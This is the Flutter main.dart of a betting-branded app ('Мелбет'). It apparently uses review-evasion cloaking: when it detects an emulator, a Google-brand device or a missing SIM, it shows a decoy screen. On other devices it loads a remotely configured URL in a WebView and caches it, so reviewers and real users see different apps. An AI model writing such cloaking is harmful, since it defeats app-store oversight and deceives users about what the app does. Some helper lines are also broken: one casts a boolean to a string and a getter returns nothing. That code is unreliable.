import 'dart:io';

import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:test_ex_ds/screens/web_view_screen.dart';
import 'package:test_ex_ds/services/platform_service.dart';
import 'package:test_ex_ds/services/remote_config_service.dart';
import 'package:test_ex_ds/widgets/plug_stopwatch.dart';

import 'screens/plug.dart';

void main() async {
  await WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp();
  final prefs = await SharedPreferences.getInstance();
  String? path = prefs.getString('bannerUrl');
  await initDevice();
  if (path == null || path == "") {
    String ur = await RemoteConfigService.setupRemoteConfig();
    print(ur);
    if (ur.isEmpty || isNotEmu == false || brand.contains('google') || sim.isEmpty) {
      print("1 рубеж не пройдет");
      runApp(const Plug());
    } else {
      print("1 рубеж пройдет");
      runApp(WebViewPage(url: ur));
      setBannerUrl(ur);
    }
  } else {
    print("2 рубеж пройдет");
    runApp(WebViewPage(
      url: path,
    ));
  }
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    final RemoteConfigService remoteConfigService = RemoteConfigService();
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: "Мелбет",
      routes: {
        '/plug/plan': (context) => const Plug(),
      },
      home: FutureBuilder<String>(
        future: RemoteConfigService.setupRemoteConfig(),
        builder: (BuildContext context, AsyncSnapshot<String> snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              width: double.infinity,
              height: double.infinity,
              color: Colors.white,
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: const [
                  Padding(
                    padding: EdgeInsets.all(16.0),
                    child: Image(
                      image: AssetImage(
                        "assets/icon.png",
                      ),
                      width: 80,
                      height: 80,
                    ),
                  ),
                  CircularProgressIndicator(),
                ],
              ),
            );
          }
          print(snapshot.requireData);
          if (snapshot.requireData == "") {
            return const Plug();
          } else {
            setBannerUrl(snapshot.requireData);
          }
          return snapshot.hasData
              ? WebViewPage(
                  url: snapshot.requireData,
                )
              : const Plug();
        },
      ),
    );
  }
}

Future getBannerUrl() async {
  final prefs = await SharedPreferences.getInstance();
  await prefs.getString('bannerUrl');
}

Future setBannerUrl(String url) async {
  final prefs = await SharedPreferences.getInstance();
  await prefs.setString('bannerUrl', url) as String;
}
